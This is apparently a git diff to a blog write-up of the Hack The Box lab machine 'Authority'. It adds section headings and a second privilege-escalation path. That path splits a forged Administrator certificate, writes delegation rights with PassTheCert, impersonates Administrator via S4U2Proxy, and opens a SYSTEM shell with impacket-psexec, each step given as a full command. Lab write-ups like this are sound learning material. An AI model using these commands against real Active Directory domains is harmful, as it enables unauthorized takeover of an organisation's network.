@@ -1,9 +1,9 @@
 ---
 title: HTB - Authority (Medium)
 date: '2025-07-29'
-tags: ['machine', 'windows', 'Active Directory']
+tags: ['machine', 'windows', 'Active Directory', 'ansible2john', 'pwm', 'pass-back-attack', 'Certificate Service DCOM Access', 'ESC1', 'ldap-shell', 'Schannel', 'S4U2Self', 'S4U2Proxy']
 draft: false
-summary: 
+summary: SMB enumeration reveals ansible configuration files for a running webserver that is hosting an LDAPS Server. In those files, contains an ansible vault that has a crackable password revealing credentials to the LDAP Server and executing a Pass-Back Attack revealing more sensitive credentials that are used for initial foothold. Later enumerating ADCS reveals ESC1 for Computer Accounts group which led to creating a computer account and spawning an LDAP-shell and adding the low-privileged user to the Administrators group gaining DA access
 ---
 
 ![Description](/static/images/htb/windows/authority/authority.png)
@@ -280,6 +280,8 @@ Looking at at the configuration manager page, the logs are authenticating as `sv
 After looking around, turns out the Ansible file at `main.yml` file is an encrypted vault that we can bruteforce using 
 ansible2john
 
+## Cracking
+
 ![Description](/static/images/htb/windows/authority/12.jpg)
 
 The file has 3 encrypted blobs in the same vault so I assumed the password was the same. We need to save one of the blobs in
@@ -331,6 +333,8 @@ Then I tried to login to the configuration webpage with `pWm_@dm!N_!23` and it w
 
 ![Description](/static/images/htb/windows/authority/15.jpg)
 
+## Gaining Access
+
 Since this looked like an LDAP configuration page, I opted to try the Pass-back Attack like I did in [Return](https://mfkrypt.github.io/blog/htb/machines/windows/return#recon)
 
 Start a listener
@@ -378,6 +382,8 @@ Nice! we can also WinRM inside the machine and get the user flag
 
 ![Description](/static/images/htb/windows/authority/21.jpg)
 
+## Privilege Escalation
+
 I tried to run Winpeas but didn't found anything useful. So i ran Bloodhound
 
 ![Description](/static/images/htb/windows/authority/22.jpg)
@@ -412,6 +418,16 @@ we can add a computer by inspecting the `MachineAccountQuota` attribute.
 ```
 
 ![Description](/static/images/htb/windows/authority/25.jpg)
+
+### Using LDAP-Shell
+
+Attack path:
+
+1. Create a Rogue Computer
+2. Exploit ESC1 as Computer Account
+3. Request Administrator certificate
+4. Authenticate using LDAP-Shell
+5. Add low-priv user to `Administrators` group
 
 Perfect, we can add up to 10 computers. Now, let us add the rogue computer
 
@@ -485,7 +501,102 @@ Yep, now we can manually grab the flag from `Administrator`'s `Desktop`
 
 ![Description](/static/images/htb/windows/authority/32.jpg)
 
-Now, for the 2nd method that is a little bit different, 
+### PassTheCert
+
+Now, for the 2nd method that is a little bit different,
+
+Attack path:
+
+1. Create a Rogue Computer
+2. Delegate rights from rogue computer to target machine
+3. S4U2Self/S4U2Proxy to request Service Ticket
+4. Authenticate using Kerberos
+
+Continuing our original path, we discovered earlier that the DC does not support PKINIT authentication,
+we need to split the Private Key file and the Certificate file
+
+```
+❯ certipy cert -pfx administrator.pfx -nocert -out administrator.key
+❯ certipy cert -pfx administrator.pfx -nokey -out administrator.crt
+```
+
+![Description](/static/images/htb/windows/authority/33.jpg)
+
+Impacket's rbcd tool does not have a method to authenticate with certificates, so we will use this tool, [PassTheCert.py](https://github.com/AlmondOffSec/PassTheCert)
+. It also has the ability the write RBCDs and delegate rights
+
+![Description](/static/images/htb/windows/authority/34.jpg)
+
+```
+❯ python3 ../../tools/AD-box/PassTheCert/Python/passthecert.py -action write_rbcd -crt administrator.crt -key administrator.key -delegate-to 'AUTHORITY$' -delegate-from 'ATTACKERSYSTEM$' -dc-ip 10.129.241.30 -domain authority.htb
+```
+
+![Description](/static/images/htb/windows/authority/35.jpg)
+
+Now, we request a Service Ticket to the CIFS service on behalf of `Administrator` using S4U2Proxy
+
+```
+❯ impacket-getST -spn cifs/authority.htb -impersonate Administrator authority.htb/ATTACKERSYSTEM$:Password123!
+```
+
+![Description](/static/images/htb/windows/authority/36.jpg)
+
+It fails, based on the error response I assumed it had to do with some of domain resolving issues. I went back to the initial ADCS enumeration command and noticed this
+DNS being failed to resolve
+
+![Description](/static/images/htb/windows/authority/37.jpg)
+
+I added that to my `hosts` file:
+
+```
+<IP>   authority.authority.htb authority.htb
+```
+
+```
+❯ impacket-getST -spn cifs/authority.authority.htb -impersonate Administrator authority.htb/ATTACKERSYSTEM$:Password123!
+```
+
+![Description](/static/images/htb/windows/authority/38.jpg)
+
+It worked, now we export the ticket to the `KRB5CCNAME` variable
+
+```
+export KRB5CCNAME=Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache
+```
+
+Authenticate using Kerberos and get a shell as SYSTEM
+
+```
+impacket-psexec authority.htb/administrator@authority.authority.htb -k -no-pass
+```
+
+![Description](/static/images/htb/windows/authority/39.jpg)
+
+
+## Sources
+
+- https://www.youtube.com/watch?v=OHwjeGUSM4w
+- https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf
+- https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/
+- https://docs.ansible.com/ansible/2.9/user_guide/vault.html#decrypting-encrypted-files
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
